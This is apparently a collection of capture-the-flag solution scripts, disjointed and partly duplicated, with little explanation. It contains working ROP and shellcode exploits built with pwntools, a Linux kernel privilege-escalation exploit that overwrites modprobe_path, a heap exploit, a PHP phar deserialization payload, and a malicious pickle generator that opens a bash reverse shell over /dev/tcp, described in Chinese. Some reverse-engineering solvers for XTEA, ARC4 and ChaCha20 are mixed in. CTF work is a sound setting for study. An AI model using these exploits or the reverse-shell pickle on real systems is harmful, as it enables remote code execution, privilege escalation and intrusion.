if ($plaintext.Length -ne 36) { Set-Content -Path "log.txt" -Value "ERROR" exit}$encrypted1Text = enENenenene2 -inputbyte ( enenenENene2 -inputbyte ( enenenenene3 -inputbyte ( Enenenenene2 -inputbyte ( enenenenene2 -inputbyte ( enenenenene2 -inputbyte ( enenenenene1 -input $plaintext))))))$result = @(38304, 8928, 43673, 25957 , 67260, 47152, 16656, 62832 , 19480 , 66690, 40432, 15072 , 63427 , 28558 , 54606, 47712 , 18240 , 68187 , 18256, 63954 , 48384, 14784, 60690 , 21724 , 53238 , 64176 , 9888 , 54859 , 23050 , 58368 , 46032 , 15648 , 64260 , 17899 , 52782 , 51968 , 12336 , 69377 , 27844 , 43206 , 63616)for ($k = 0; $k -lt $result.Length; $k++) { if ($encrypted1Text[$k] -ne $result[$k]) { Set-Content -Path "log.txt" -Value "ERROR" exit
 }}Set-Content -Path "log.txt" -Value "RIGHT"

from Crypto.Cipher import ARC4

flag = [38304, 8928, 43673, 25957, 67260, 47152, 16656, 62832, 19480, 66690, 40432, 15072, 63427, 28558, 54606, 47712, 18240, 68187, 18256, 63954, 48384, 14784, 60690, 21724, 53238, 64176, 9888, 54859, 23050, 58368, 46032, 15648, 64260, 17899, 52782, 51968, 12336, 69377, 27844, 43206, 63616]

def dec2(tmp): key = [0x70, 0x30, 0x77, 0x65, 0x72] for i in range(len(tmp)): tmp[i] -= key[i % len(key)] return tmp

def dec3(tmp): key = [0x70, 0x30, 0x77, 0x33, 0x72] for i in range(len(tmp)): tmp[i] //= key[i % len(key)] return tmp

def enc1(tmp): tmp = bytes(tmp) key = bytes([0x70, 0x6f, 0x77, 0x65, 0x72]) ct = b'' for i in range(len(tmp)): ct = ARC4.new(key).encrypt(tmp) key = ARC4.new(ct).encrypt(key) # update key return ct+key

def dec1(tmp): ct = bytes(tmp[:-5]) key = bytes(tmp[-5:]) key = ARC4.new(ct).encrypt(key) # update key ct = ARC4.new(key).encrypt(ct) return ct

flag = dec2(flag)flag = dec2(flag)flag = dec3(flag)flag = dec2(flag)flag = dec2(flag)flag = dec2(flag)print(flag)print(len(flag))print(dec1(flag))
a = bytes([1,2,3,4,5])test = list(enc1(a))print('--------')print(list(dec1(test)))

#include "defs.h"
#include <stdio.h>#include <memory.h>#include <stdint.h>#include <stdio.h>#include <stdlib.h>#include <string.h>#include <ctype.h>
void sub_402001(uint32_t *a1, uint8_t *a2){ // 从IDA里复制代码}
int sub_4020F7(uint32_t *a1){ // 从IDA里复制代码}
int main() { uint8_t ct2[16] = {}; uint8_t ct[16] = {}; int a1[192]; for (int i = 0; i < 0x10; i++) { for (int ch = 0; ch < 0x100; ch++) { memcpy(ct, ct2, i); ct[i] = ch; sub_402001((uint32_t *)a1, ct); int res = sub_4020F7((uint32_t *)a1); if (res > i) { printf("[%d] %d %02Xn", i, res, ch); ct2[i] = ch; break; } } } return 0;}

int __cdecl main(int argc, const char **argv, const char **envp){ int a1[192]; // [rsp+A0h] [rbp+20h] BYREF uint8_t ct[80]; // [rsp+3A0h] [rbp+320h] BYREF
 sub_402B00(); scanf( "%02x%02x%02x%02x-%02x%02x-%02x%02x-%02x%02x-%02x%02x%02x%02x%02x%02x", inp, &inp[1], &inp[2], &inp[3], &inp[4], &inp[5], &inp[6], &inp[7], &inp[8], &inp[9], &inp[10], &inp[11], &inp[12], &inp[13], &inp[14], &inp[15]); // 4d87ef03-77bb-491a-80f5-4620245807c4 aes(inp, key, ct); // ct: 12 8F EC C2 85 04 B2 4C 5B BA 4A CF 11 36 0A 48 // key: 3577402ECCA44A3F9AB72182F9B01F35 sub_402001((uint32_t *)a1, ct); if ( sub_4020F7((uint32_t *)a1) ) printf("Right"); return 0;}


```
from pwn import *from ctypes import *io = process('./vuln')elf = ELF('./vuln')context(log_level='debug',arch='amd64',os='linux')#io = remote("pwn-529731b787.challenge.xctf.org.cn", 9999, ssl=True)libc = ELF('./libc.so.6')
io.send(b'x00'*0x12)
cdll = CDLL('./libc.so.6')cdll.srand(0)for i in range(100): io.recvuntil('Input the authentication code:n') io.send(p64(cdll.rand()%100+1))io.recvuntil(b'>> n')io.send(p32(1))io.recvuntil(b'Index: ')io.send(p32(1))io.recvuntil(b'Note: ')io.send(b'a'*0x100)pop_rdi = 0x401893fake_rbp = 0x4042A0io.send(b'a'*0x100 + p64(fake_rbp) + p64(pop_rdi) + p64(elf.got['read']) + p64(elf.sym["puts"]) + p64(0x4013CF))io.recvuntil(b'x0a')libcbase = u64(io.recv(6).ljust(8,b'x00'))-libc.sym["read"]
pop_rdi = libcbase+libc.search(asm("pop rdinret")).__next__()pop_rsi = libcbase+libc.search(asm("pop rsinret")).__next__()pop_rdx_r12 = libcbase+libc.search(asm("pop rdxnpop r12nret")).__next__()mprotect = libcbase + libc.sym['mprotect']
payload = b'b'*0x108 + p64(pop_rdx_r12)+p64(0x700) + p64(0) + p64(elf.plt['read'])io.send(payload)payload = b'a'*0x128payload += p64(pop_rdi) + p64(fake_rbp&0xfff000) + p64(pop_rsi) + p64(0x1000) + p64(pop_rdx_r12) + p64(7)*2 + p64(mprotect)payload += p64(fake_rbp+0x70)payload +=asm(shellcraft.open("/flag")+shellcraft.read(3,fake_rbp+0x200,0x50)+shellcraft.write(1,fake_rbp+0x200,0x50))
io.send(payload)io.interactive()
#!/usr/bin/python3
# -*- encoding: utf-8 -*-
from pwncli import *context(arch='amd64', os='linux', log_level='debug')
# use script mode#cli_script()io=gift['io']=remote()libc=gift['libc']=ELF('./libc.so.6')elf=gift['elf']=ELF("./vuln")

pop_rdi=0x0000000000401393leave_ret=0x4012EEbss_addr=0x404060

payload=b'a'*0x108+p64_ex(pop_rdi)+p64_ex(elf.got['puts'])+p64_ex(elf.plt['puts'])+p64_ex(0x4012C0)sa(b"lets move and pwn!",payload)
set_current_libc_base_and_log(recv_current_libc_addr(),libc.symbols['puts'])CG.set_find_area(find_in_elf=False,find_in_libc=True)
payload=b'a'*0x100+p64_ex(bss_addr+0x200-8)+p64_ex(CG.pop_rsi_ret())+p64_ex(bss_addr+0x200)+p64_ex(elf.plt['read'])+p64_ex(leave_ret)s(payload)
payload=flat( pop_rdi,bss_addr&(~0xfff),CG.pop_rsi_ret(),0x2000,CG.pop_rdx_ret(),7,libc.symbols['mprotect'], bss_addr+0x200+0x40)payload=payload+asm(shellcraft.open("/flag",0)+shellcraft.read(3,bss_addr+0x100,0x50)+shellcraft.write(1,bss_addr+0x100,0x50))s(payload)
ia()
#!/usr/bin/python3
# -*- encoding: utf-8 -*-
from pwncli import *context(arch='amd64', os='linux', log_level='debug')

io=gift['io']=remote()libc=gift['libc']=ELF('./libc.so.6')

for i in range(5): sla(b':','0 '+str(i))
sa(b"Do you think this victory is easy? Is there anything you want to say?",b'x08'*9+b'x35')sa(b"Do you want to end the game [Y/N]",b'N ')sla(b':',b'0 15')sla(b"Please enter the administrator key",str(0x6b8b4567))
sla(b"[*] Administrator successfully logged in!n",b'/proc/self/maps')data=ru(b'r-xp 00000000 fd:00 3237109669 /lib/')set_current_libc_base_and_log(int(data[-78:-66],16),0)one_gadget=get_current_one_gadget_from_libc()[0]
CG.set_find_area(find_in_libc=True,find_in_elf=False)for i in range(5): sla(b':','0 '+str(i))sa(b"Do you think this victory is easy? Is there anything you want to say?",p64_ex(libc.address+0x1425e1)*2+p64_ex(libc.address+0x2164f)*2+p64_ex(CG.bin_sh())+p64_ex(libc.symbols['system']))sa(b"Do you want to end the game [Y/N]",b'N ')sla(b':',b'0 15')
#./pwn2 -c test flag

ia()
    #define _GNU_SOURCE#include <sys/types.h>#include <stdio.h>#include #include <fcntl.h>#include <stdint.h>#include <sys/syscall.h>#include <sched.h>#include <linux/if_ether.h>#include <linux/if_packet.h>#include <sys/mman.h>#include <sys/socket.h>#include <linux/keyctl.h>
    #define COLOR_GREEN " 33[32m"#define COLOR_RED " 33[31m"#define COLOR_YELLOW " 33[33m"#define COLOR_DEFAULT " 33[0m"
    #define logd(fmt, ...) dprintf(2, "[*] %s:%d " fmt "n", __FILE__, __LINE__, ##__VA_ARGS__)#define logi(fmt, ...) dprintf(2, COLOR_GREEN "[+] %s:%d " fmt "n" COLOR_DEFAULT, __FILE__, __LINE__, ##__VA_ARGS__)#define logw(fmt, ...) dprintf(2, COLOR_YELLOW "[!] %s:%d " fmt "n" COLOR_DEFAULT, __FILE__, __LINE__, ##__VA_ARGS__)#define loge(fmt, ...) dprintf(2, COLOR_RED "[-] %s:%d " fmt "n" COLOR_DEFAULT, __FILE__, __LINE__, ##__VA_ARGS__)#define die(fmt, ...) do { loge(fmt, ##__VA_ARGS__); loge("Exit at line %d", __LINE__); exit(1); } while (0)
void bind_core(int core){ cpu_set_t cpu_set;
 CPU_ZERO(&cpu_set); CPU_SET(core, &cpu_set); sched_setaffinity(getpid(), sizeof(cpu_set), &cpu_set);
 logi("Process binded to core %d", core);}
int fd = 0;u_int64_t heap_addr = 0, kbase_addr = 0;
typedef struct edit{ char *content;} edit_arg;
void add(char *content){ edit_arg tmp = { .content = content, };
 ioctl(fd, 0x20, &tmp);}
void edit(char *content){ edit_arg tmp = { .content = content, };
 ioctl(fd, 0x50, &tmp);}
void delete(char *content){ edit_arg tmp = { .content = content, };
 ioctl(fd, 0x30, &tmp);}
void unshare_setup(){ int temp_fd; uid_t uid = getuid(); gid_t gid = getgid(); char buffer[0x100];
 if (unshare(CLONE_NEWUSER | CLONE_NEWNS | CLONE_NEWNET)) { die("unshare(CLONE_NEWUSER | CLONE_NEWNS)"); }
 temp_fd = open("/proc/self/setgroups", O_WRONLY); write(temp_fd, "deny", strlen("deny")); close(temp_fd);
 temp_fd = open("/proc/self/uid_map", O_WRONLY); snprintf(buffer, sizeof(buffer), "0 %d 1", uid); write(temp_fd, buffer, strlen(buffer)); close(temp_fd);
 temp_fd = open("/proc/self/gid_map", O_WRONLY); snprintf(buffer, sizeof(buffer), "0 %d 1", gid); write(temp_fd, buffer, strlen(buffer)); close(temp_fd); return;}
int create_socket_and_alloc_pages(unsigned int size, unsigned int nr){ struct tpacket_req req; int socket_fd, version; int ret;
 socket_fd = socket(AF_PACKET, SOCK_RAW, PF_PACKET); if (socket_fd < 0) { printf("[x] failed at socket(AF_PACKET, SOCK_RAW, PF_PACKET)n"); ret = socket_fd; goto err_out; }
 version = TPACKET_V1; ret = setsockopt(socket_fd, SOL_PACKET, PACKET_VERSION, &version, sizeof(version)); if (ret < 0) { die("[x] failed at setsockopt(PACKET_VERSION)n"); goto err_setsockopt; }
 memset(&req, 0, sizeof(req)); req.tp_block_size = size; req.tp_block_nr = nr; req.tp_frame_size = 0x1000; req.tp_frame_nr = (req.tp_block_size * req.tp_block_nr) / req.tp_frame_size;
 ret = setsockopt(socket_fd, SOL_PACKET, PACKET_TX_RING, &req, sizeof(req)); if (ret < 0) { die("[x] failed at setsockopt(PACKET_TX_RING)n"); goto err_setsockopt; }
 return socket_fd;
err_setsockopt: close(socket_fd);err_out: return ret;}int packet_socket_setup(uint32_t block_size, uint32_t frame_size, uint32_t block_nr, uint32_t sizeof_priv, int timeout){ int s = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL)); if (s < 0) { perror("[-] socket (AF_PACKET)"); exit(1); }
 int v = TPACKET_V3; int rv = setsockopt(s, SOL_PACKET, PACKET_VERSION, &v, sizeof(v)); if (rv < 0) { perror("[-] setsockopt (PACKET_VERSION)"); exit(1); }
 struct tpacket_req3 req3; memset(&req3, 0, sizeof(req3)); req3.tp_sizeof_priv = sizeof_priv; req3.tp_block_nr = block_nr; req3.tp_block_size = block_size; req3.tp_frame_size = frame_size; req3.tp_frame_nr = (block_size * block_nr) / frame_size; req3.tp_retire_blk_tov = timeout; req3.tp_feature_req_word = 0;
 rv = setsockopt(s, SOL_PACKET, PACKET_RX_RING, &req3, sizeof(req3)); if (rv < 0) { perror("[-] setsockopt (PACKET_RX_RING)"); exit(1); }
 struct sockaddr_ll sa; memset(&sa, 0, sizeof(sa)); sa.sll_family = PF_PACKET; sa.sll_protocol = htons(ETH_P_ALL); sa.sll_ifindex = if_nametoindex("lo"); sa.sll_hatype = 0; sa.sll_halen = 0; sa.sll_pkttype = 0; sa.sll_halen = 0;
 rv = bind(s, (struct sockaddr *)&sa, sizeof(sa)); if (rv < 0) { perror("[-] bind (AF_PACKET)"); exit(1); }
 return s;}
int key_alloc(char *description, char *payload, size_t plen){ return syscall(__NR_add_key, "user", description, payload, plen, KEY_SPEC_PROCESS_KEYRING);}
int key_read(int keyid, char *buffer, size_t buflen){ return syscall(__NR_keyctl, KEYCTL_READ, keyid, buffer, buflen);}
char page_tmp[0x10000];
void main(){ char tmp[0x28]; char payload[0x10];
 int key_id[0x50]; bind_core(0); unshare_setup(); fd = open("/dev/ker", O_RDONLY); if (fd < 0) { die("opne /dev/ker error"); }
 add(tmp); delete (tmp);
 key_id[0] = key_alloc(tmp, payload, 0x10);
 delete (tmp);
 int block_nr = 0x28 / 0x8; int packet_fds = packet_socket_setup(0x1000, 0x800, block_nr, 0, 1000);
 key_read(key_id[0], page_tmp, 0xf000); size_t ptr = page_tmp; while (kbase_addr == 0) { u_int64_t tmp = *(size_t *)ptr; if ((tmp & 0xfff) == 0x1d0 && tmp > 0xFFFFFFFF00000000) { kbase_addr = tmp - 0x17741d0; } ptr += 8; if (ptr == page_tmp + 0xf000) { die("error"); } } logi("kbase_addr :0x%llx", kbase_addr);
 *(size_t *)tmp = kbase_addr + 0x21d8000; edit(tmp); char *page = mmap(NULL, 0x1000 * block_nr, PROT_READ | PROT_WRITE, MAP_SHARED, packet_fds, 0); if (page < 0) { die("page"); }
 memcpy(page + 0xce0, "/tmp/modprobe", 14);
 system("echo -ne '\xff\xff\xff\xff' > /tmp/dummy"); system("echo '#!/bin/shnchmod 777 /flag' > /tmp/modprobe"); system("chmod +x /tmp/modprobe"); system("chmod +x /tmp/dummy");
 system("/tmp/dummy");}
from pwn import *

exe = './vuln'# context.terminal = ['wt.exe', 'wsl.exe', 'bash', '-c']context.binary = ELF(exe, False)binary: ELF = context.binary
# libc: ELF = ELF('./libc.so.6', False)
REMOTE = args.REMOTE or 0if REMOTE: p = remote("", 9999, ssl=True)else: p = process(exe)sd, sa, sl, sla = p.send, p.sendafter, p.sendline, p.sendlineafterrn, rl, ru, ia = p.recvn, p.recvline, p.recvuntil, p.interactive
shellcode = bytes.fromhex('66be000364488b2631c031ff4889e60f05585f5e5ac3')if not shellcode: code = ''' mov si, 0x300 mov rsp, fs:[rsi] xor eax, eax xor edi, edi mov rsi, rsp syscall pop rax pop rdi pop rsi pop rdx ret ''' shellcode = asm(code) print(shellcode.hex())hexcode = shellcode.hex()print(len(shellcode))assert len(shellcode) <= 22, len(shellcode)
# gdb.attach(p, 'brva 0x18a6nc')sla(b'input:', ('{"shellcode":"'+hexcode+'"}').encode())
payload = flat([ # rax rdi rsi rdx constants.SYS_write, 1, 0xdeadbeef, 0x100, 0x999800c, constants.SYS_read, 0, 0xdeadbeef, 0x1000, 0x999800c,])sla(b'loaded!n', payload)
dump = rn(0x100)print(hexdump(dump))stack = u64(dump[0x58:
0x60])rsp_addr = stack-0xa8print(hex(rsp_addr))
syscall_addr = 0x999800f
payload = flat({ 0x00: [ # rax rdi rsi rdx constants.SYS_open, rsp_addr+0x100, 0, 0x4000, syscall_addr, # open('rsp', 'O_RDONLY', 0x4000) constants.SYS_read, 3, rsp_addr+0x200, 50, syscall_addr, constants.SYS_write, 1, rsp_addr+0x200, 50, syscall_addr, ], 0x100: b'/flagx00'})sd(payload)
ia()
#!/usr/bin/env python3'''Author:
7resp4ssDate:
2024-10-19 20:55:
09Usage: Debug : python3 exp.py debug elf-file-path -t -b malloc Remote: python3 exp.py remote elf-file-path ip:
port'''
from pwncli import *cli_script()

io: tube = gift.ioelf: ELF = gift.elflibc: ELF = gift.libc
filename = gift.filename # current filenameis_debug = gift.debug # is debug or not is_remote = gift.remote # is remote or notgdb_pid = gift.gdb_pid # gdb pid if debug
if gift.remote: libc = ELF("./libc.so.6") gift[libc] = libc

def cmd(i, prompt=">"): sla(prompt, str(i))
def add(i,sz): cmd('1') sla("[+] input your index",str(i)) sla("[+] input your size",str(sz)) #......
def edit(i,cont): cmd('2') sla("[+] input your index",str(i)) sla("content",cont)
 #......
def show(i): cmd('4') sla("[+] input your index",str(i)) #......
def dele(i): cmd('3') sla("[+] input your index",str(i)) #......
add(0,0x500)add(1,0x500)dele(0)show(0)lb = recv_current_libc_addr(0x21ace0,0x100)libc.address = lb add(0xe,0x700)io_attack = IO_FILE_plus_struct().house_of_apple2_execmd_when_exit(libc.sym._IO_2_1_stderr_, libc.sym._IO_wfile_jumps, libc.sym.system, "sh")
edit("-4",io_attack)sl("5")
ia()
import pickleimport os
class MaliciousCommand: def __reduce__(self): # 返回一个元组，表示调用 eval 执行的命令 return (os.system, ("bash -c 'bash -i >& /dev/tcp/55555/5555 0>&1'",))
# 创建一个包含恶意命令的对象
def create_malicious_object(): malicious_object = MaliciousCommand() data = { 'malicious_command': malicious_object } return data
def create_pickle_file(filename): data_to_pickle = create_malicious_object()
 with open(filename, 'wb') as f: pickle.dump(data_to_pickle, f)
create_pickle_file('malicious.pkl')代码解析：导入库：
python复制代码import pickleimport os仅导入了 pickle 和 os 库。
定义恶意命令的类：
python复制代码
class MaliciousCommand: def __reduce__(self): return (os.system, ("bash -c 'bash -i >& /dev/tcp/1/6969 0>&1'",))MaliciousCommand 类实现了 __reduce__ 方法，返回一个元组，其中包含 os.system 和要执行的命令字符串。这样，当该对象被反序列化时，命令将会执行。
创建包含恶意对象的函数：
python复制代码
def create_malicious_object(): malicious_object = MaliciousCommand() data = { 'malicious_command': malicious_object } return data该函数实例化 MaliciousCommand，并将其包含在一个字典中。
创建 pickle 文件的函数：
python复制代码
def create_pickle_file(filename): data_to_pickle = create_malicious_object()
 with open(filename, 'wb') as f: pickle.dump(data_to_pickle, f)这个函数调用 create_malicious_object，然后将生成的数据序列化并写入指定的文件。
调用创建文件的函数：
python复制代码create_pickle_file('malicious.pkl')最后，调用该函数生成包含恶意代码的 pickle 文件。
注意这段代码仅用于教育目的，展示了如何构建可能的安全漏洞。在实际应用中，绝对不要使用这种方法，特别是处理不可信数据时。相应的安全措施和最佳实践应始终得以遵循。
<?php
class CapooObj { public function __wakeup(){ $action = $this->action; $action = str_replace(""", "", $action); $action = str_replace("'", "", $action); $banlist = "/(flag|php|base|cat|more|less|head|tac|nl|od|vi|sort|uniq|file|echo|xxd|print|curl|nc|dd|zip|tar|lzma|mv|www|~|`|r|n|t| |^|ls|.|tail|watch|wget|||;|:|(|)|{|}|*|?|[|]|@|\|=|<)/i"; if(preg_match($banlist, $action)){ die("Not Allowed!"); } system($this->action); }}header("Content-type:
text/html;charset=utf-8");if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['capoo'])) { $file = $_POST['capoo']; if (file_exists($file)) { $data = file_get_contents($file); $base64 = base64_encode($data); } else if (substr($file, 0, strlen("http://")) === "http://") { $data = file_get_contents($_POST['capoo'] . "/capoo.gif"); if (strpos($data, "PILER") !== false) { die("Capoo piler not allowed!"); } file_put_contents("capoo_img/capoo.gif", $data); die("Download Capoo OK"); } else { die('Capoo does not exist.'); }} else { die('No capoo provided.');}?><!DOCTYPE html><html> <head> <title>Display Capoo</title> </head>  ' /> </html>
<?php
class CapooObj{ public $action = 'l$1s$IFS/';}$phar = new Phar('9.phar');
$phar -> stopBuffering();$phar -> setStub('test'.'<?php __HALT_COMPILER();?>');$phar -> addFromString('test.txt','test');
$object = new CapooObj();$phar -> setMetadata($object);$phar -> stopBuffering();
import hashlib
def generate_md5(number): return hashlib.md5(str(number).encode()).hexdigest()
md5_dict = {str(i): generate_md5(i) for i in range(1, 1000000)}
file_path = './dic.txt'with open(file_path, 'w') as file: for key, value in md5_dict.items(): file.write(f"{value}n")
package com.nobody.Serv1ce;
import android.app.Service;
import android.content.Intent;
import android.os.IBinder;
import android.widget.Toast;
/* loaded from: classes.dex */public class MyService extends Service { private String input; private String key = "1liIl11lIllIIl11llII"; private byte[] keyarray = new byte[64]; int num = 9;
 private native boolean check(String str, byte[] bArr, int i);
 static { System.loadLibrary("Serv1ce"); }
 @Override // android.app.Service public void onCreate() { this.num++; super.onCreate(); }
 @Override // android.app.Service public int onStartCommand(Intent intent, int i, int i2) { this.num++; for (int i3 = 0; i3 < 64; i3++) { byte[] bArr = this.keyarray; String str = this.key; bArr[i3] = (byte) (((str.charAt(i3 % str.length()) - 'w') ^ 23) & 255); } if (intent != null) { this.input = intent.getStringExtra("input"); Toast.makeText(getApplicationContext(), "Input Success", 1).show(); } super.onStartCommand(intent, i, i2); return i; }
 @Override // android.app.Service public IBinder onBind(Intent intent) { throw new UnsupportedOperationException("Not yet implemented"); }
 @Override // android.app.Service public void onDestroy() { if (check(this.input, this.keyarray, this.num)) { Toast.makeText(getApplicationContext(), "You Are Right", 1).show(); } else { Toast.makeText(getApplicationContext(), "Wrong", 1).show(); } super.onDestroy(); }}
// libServ1ce.so
__int64 __fastcall Java_com_nobody_Serv1ce_MyService_check(JNIEnv *a1, __int64 a2, void *a3, void *a4, char num){ // [COLLAPSED LOCAL DECLARATIONS. PRESS KEYPAD CTRL-"+" TO EXPAND]
 v14 = *(_QWORD *)(_ReadStatusReg(ARM64_SYSREG(3, 3, 13, 0, 2)) + 40); inp = (*a1)->GetStringUTFChars(a1, a3, v13); key = (*a1)->GetByteArrayElements(a1, a4, v13); if ( strlen(inp) == 36LL ) { i = 0LL; while ( 1 ) { v11 = (inp[i] ^ key[i]) * num; inp[i] = v11; if ( enc_flag[i] != v11 ) break; if ( ++i == 36 ) return 1LL; } } return 0LL;}
from claripy import *
key = b"1liIl11lIllIIl11llII"keyarray = bytearray(64)
enc_flag = bytearray.fromhex('B932C2D469D5CAFBF8FB807CD4E593D51C8BF8DFDAA111F8A19393C27C8B1C66013DA367')for i in range(64): keyarray[i] = ((key[i%len(key)]-ord('w'))^23)&0xFF
inp = [BVS('', 8) for i in range(len(enc_flag))]tmp = [None]*len(inp)num = 11for i in range(len(inp)): tmp[i] = ((inp[i]^keyarray[i])*num)&0xFFs = Solver()for i in range(len(tmp)): s.add(tmp[i] == enc_flag[i])for x in s.batch_eval(inp, 2): print(bytes(x))
import struct
ROUND = 0x66DELTA = 0x9E3779B9

def xtea_decrypt(v0, v1, key): _sum = (DELTA*ROUND) & 0xFFFFFFFF for i in range(ROUND): # v1 -= (((v0 << 4) ^ (v0 >> 5)) + v0) ^ (sum + k[(sum >> 11) & 3]); t0 = (v0 << 4) & 0xFFFFFFFF t0 ^= 0x88F5736E
 t1 = v0 >> 5 t1 ^= 0x99AD88A7
 t2 = t1 ^ t0 t2 ^= 0x1158FBC9
 t2 += v0 t2 &= 0xFFFFFFFF t2 ^= 0x44EEEFEA
 t3 = (_sum + key[(_sum >> 11) & 3]) & 0xFFFFFFFF t3 ^= 0xFB4E3E5D
 v1 -= t2 ^ t3 ^ 0xbfa0d1b7 v1 &= 0xFFFFFFFF
 _sum -= DELTA _sum &= 0xFFFFFFFF
 # v0 += (((v1 << 4) ^ (v1 >> 5)) + v1) ^ (sum + k[sum & 3]); t0 = v1 << 4 t0 ^= 0x48130B32
 t1 = v1 >> 5 t1 ^= 0xD4ACF437
 t2 = t1 ^ t0 t2 ^= 0x9CBFFF05 t2 += v1 t2 &= 0xFFFFFFFF t2 ^= 0x1CDCBBA3
 t3 = ((_sum+key[_sum & 3]) ^ 0x939142A0) & 0xFFFFFFFF v0 -= t2 ^ t3 ^ 0x8f4df903 v0 &= 0xFFFFFFFF
 return v0, v1
# add 40
# xor 7f

tmp = bytes.fromhex( 'A1E35198865676496F6B2B81CFCE1296A270353C31625CF1FA776BAA9E6D05BEE824A4F8DB233A0B1620CC03ADB52BA9349F781D2EB9F99E')key = [0xEF6FD9DB, 0xD2C273D3, 0x6F97E412, 0x72BFD624]
data = list(struct.unpack('<14I', tmp))for i in range(0, 14, 2): data[i], data[i+1] = xtea_decrypt(data[i], data[i+1], key)
tmp = bytearray(struct.pack('<14I', *data))for i in range(len(tmp)): tmp[i] ^= 0x7Ffor i in range(len(tmp)): tmp[i] = (tmp[i]-0x40) & 0xFF
print(tmp)
# flag{u_ar3_re@11y_g00d_@t_011vm_de0bf_and_anti_debugger}
void __fastcall sub_14001FA60(__int64 a1, __int64 a2, __int64 a3){ // [COLLAPSED LOCAL DECLARATIONS. PRESS KEYPAD CTRL-"+" TO EXPAND]
 v3 = &v18; for ( i = 134i64; i; --i ) { *(_DWORD *)v3 = -858993460; v3 += 4; } j___CheckForDebuggerJustMyCode(&unk_14005A102); memset(Data, 0, 0xFFui64); cbData[0] = 255; v5 = j_decrypt_string(byte_14004E538); // Software\PacManX Value = RegOpenKeyExA(HKEY_CURRENT_USER, v5, 0, 0x20019u, &hKey); if... v8 = j_decrypt_string(s_MYFLAG); // MYFLAG Value = RegQueryValueExA(hKey, v8, 0i64, (LPDWORD)Type, Data, (LPDWORD)cbData); if... if ( j_strlen((const char *)Data) != 36 ) { v11 = j_decrypt_string(s_Error); v12 = sub_1400141C7(std::
cerr, v11); std::
ostream::
operator<<(v12, sub_140014096); exit(0); } RegCloseKey(hKey); Buffer = malloc(0xFC64ui64); v13 = j_decrypt_string(byte_14004E590); // game.data Stream = fopen(v13, "rb"); v14 = j_decrypt_string(&OldFilename); // game.tmp v26 = fopen(v14, "w"); fread(Buffer, 1ui64, 0xC2DBui64, Stream); nonce = j_decrypt_string(byte_14004E580); // powerpowerpo v15 = (unsigned int)j_decrypt_string(byte_14004E558);// powerpowerpowerpowerpowerpowerpo chacha_enc((int)Buffer, 64614, v15, (int)nonce, 0); fwrite(Buffer, 1ui64, 0xC2DBui64, v26); fclose(Stream); fclose(v26); v16 = j_decrypt_string(&FileName); // game.ps1 rename(&OldFilename, v16); // powershell.exe -File game.ps1 v17 = j_decrypt_string(byte_14004E5C0); system(v17); remove(&FileName);}
from Crypto.Cipher import ChaCha20
cipher = ChaCha20.new(key=b'powerpowerpowerpowerpowerpowerpo', nonce=b'powerpowerpo')
a = cipher.encrypt(open('./game.data', 'rb').read())print(a)
open('./ps1.data', 'wb').write(a)
function enenenenene { param( $plaintextBytes, $keyBytes ) # Initialize S and KSA $S = 0..255 $j = 0 for ($i = 0; $i -lt 256; $i++) { $j = ($j + $S[$i] + $keyBytes[$i % $keyBytes.Length]) % 256 $temp = $S[$i] $S[$i] = $S[$j] $S[$j] = $temp }
 # PRGA and encryption $i = 0 $j = 0 $ciphertextBytes = @() for ($k = 0; $k -lt $plaintextBytes.Length; $k++) { $i = ($i + 1) % 256 $j = ($j + $S[$i]) % 256 $temp = $S[$i] $S[$i] = $S[$j] $S[$j] = $temp $t = ($S[$i] + $S[$j]) % 256 $ciphertextBytes += ($plaintextBytes[$k] -bxor $S[$t]) }
 # Return ciphertext as a string return $ciphertextBytes}function enenenenene1 { param( $inputbyte ) $key = @(0x70, 0x6f, 0x77, 0x65, 0x72) $encryptedText = @(); for ($k = 0; $k -lt $inputbyte.Length; $k++) { $encryptedText = enenenenene -plaintextBytes $inputbyte -keyBytes $key; $key = enenenenene -plaintextBytes $key -keyBytes $encryptedText; } return $encryptedText + $key;}function enenenenene2 { param( $inputbyte ) $key = @(0x70, 0x30, 0x77, 0x65, 0x72) for ($k = 0; $k -lt $inputbyte.Length; $k++) { $inputbyte[$k] = $inputbyte[$k] + $key[$k % $key.Length] } return $inputbyte;}function enenenenene3 { param( $inputbyte ) $key = @(0x70, 0x30, 0x77, 0x33, 0x72) for ($k = 0; $k -lt $inputbyte.Length; $k++) { $inputbyte[$k] = $inputbyte[$k] * $key[$k % $key.Length] } return $inputbyte;}$registryPath = 'HKCU:
SoftwarePacManX'
$valueName = 'MYFLAG'$value = Get-ItemPropertyValue $registryPath $valueName$plaintext = @($value) | ForEach-Object { $input = $_ $plaintext = @() for ($i = 0; $i -lt $input.Length; $i++) { $plaintext += [int][char]$input[$i] } $plaintext}
if ($plaintext.Length -ne 36) { Set-Content -Path "log.txt" -Value "ERROR" exit}$encrypted1Text = enENenenene2 -inputbyte ( enenenENene2 -inputbyte ( enenenenene3 -inputbyte ( Enenenenene2 -inputbyte ( enenenenene2 -inputbyte ( enenenenene2 -inputbyte ( enenenenene1 -input $plaintext))))))$result = @(38304, 8928, 43673, 25957 , 67260, 47152, 16656, 62832 , 19480 , 66690, 40432, 15072 , 63427 , 28558 , 54606, 47712 , 18240 , 68187 , 18256, 63954 , 48384, 14784, 60690 , 21724 , 53238 , 64176 , 9888 , 54859 , 23050 , 58368 , 46032 , 15648 , 64260 , 17899 , 52782 , 51968 , 12336 , 69377 , 27844 , 43206 , 63616)for ($k = 0; $k -lt $result.Length; $k++) { if ($encrypted1Text[$k] -ne $result[$k]) { Set-Content -Path "log.txt" -Value "ERROR" exit
 }}Set-Content -Path "log.txt" -Value "RIGHT"
from Crypto.Cipher import ARC4

flag = [38304, 8928, 43673, 25957, 67260, 47152, 16656, 62832, 19480, 66690, 40432, 15072, 63427, 28558, 54606, 47712, 18240, 68187, 18256, 63954, 48384, 14784, 60690, 21724, 53238, 64176, 9888, 54859, 23050, 58368, 46032, 15648, 64260, 17899, 52782, 51968, 12336, 69377, 27844, 43206, 63616]

def dec2(tmp): key = [0x70, 0x30, 0x77, 0x65, 0x72] for i in range(len(tmp)): tmp[i] -= key[i % len(key)] return tmp

def dec3(tmp): key = [0x70, 0x30, 0x77, 0x33, 0x72] for i in range(len(tmp)): tmp[i] //= key[i % len(key)] return tmp

